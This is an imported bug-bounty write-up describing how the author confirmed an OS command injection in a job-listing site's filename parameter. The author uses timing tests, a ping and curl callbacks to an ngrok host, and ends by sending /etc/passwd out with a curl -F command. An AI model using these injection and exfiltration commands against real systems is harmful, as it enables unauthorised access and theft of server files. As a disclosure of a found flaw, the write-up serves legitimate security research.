---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-01-15_command-injection-poc.md
original_filename: 2019-01-15_command-injection-poc.md
title: Command Injection PoC
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: c99772e7eb93824fcc64d2db61399d159cad4c690f430dc8c686016b606ea113
text_sha256: 55ea40da538576488bc7cfe22013b3a426920f7b75d0ffc3addb90c6a067493f
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Command Injection PoC

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-01-15_command-injection-poc.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `c99772e7eb93824fcc64d2db61399d159cad4c690f430dc8c686016b606ea113`
- Text SHA256: `55ea40da538576488bc7cfe22013b3a426920f7b75d0ffc3addb90c6a067493f`


## Content

---
title: "Command Injection PoC"
url: "https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d"
authors: ["NoGe (@p4c3n0g3)"]
bugs: ["OS command injection"]
publication_date: "2019-01-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5473
scraped_via: "browseros"
---

# Command Injection PoC

Command Injection PoC
Kswari
Follow
3 min read
·
Jan 15, 2018

1.3K

5

So back in December 2017 i found a command injection vulnerability in one of job listing site. Here is the simple proof of concept. The vulnerable parameter is filename.

I do test with this command `sleep 5` and the response is delayed for 5–6 seconds (6.113 millis). See the delay in right corner below.

Press enter or click to view image in full size

I double check again with `sleep 10` just to make sure and got to see the difference. And again response is delayed for 10–11 seconds (11.137 millis). See the delay in right corner below.

Press enter or click to view image in full size

I try ping to my server using `ping -c 5 <my server IP address>` and run tcpdump -i <interface> -n icmp on my server to see incoming ICMP packets. That ping command means send 5 times ICMP packets to my server IP address.

Press enter or click to view image in full size

Sorry for the redacted but you can see i have incoming ICMP packets for 5 times. My server IP address is 5.000.000.105 and the incoming ICMP packets is from 000.000.39.169. Now i know the filename parameter is vulnerable to command injection.

Get Kswari’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I’m doing another test using ngrok. So i run ./ngrok http 80 on my localhost and i execute this `curl blablabla.ngrok.io` on the vulnerable parameter.

Now see the response on ngrok web interface (http://127.0.0.1:4040). I got incoming request from IP address 000.000.39.169. The same IP address in ICMP request above.

Now i can read files on the vulnerable server and send it to my ngrok address using this command `curl -F shl=@/etc/passwd blablabla.ngrok.io`. That command means send POST request to blablabla.ngrok.io with shl parameter that contains /etc/passwd in it.

And the result is vulnerable server send me their /etc/passwd to my ngrok address. Again from IP address 000.000.39.169.

Thats it! Happy hacking! :)
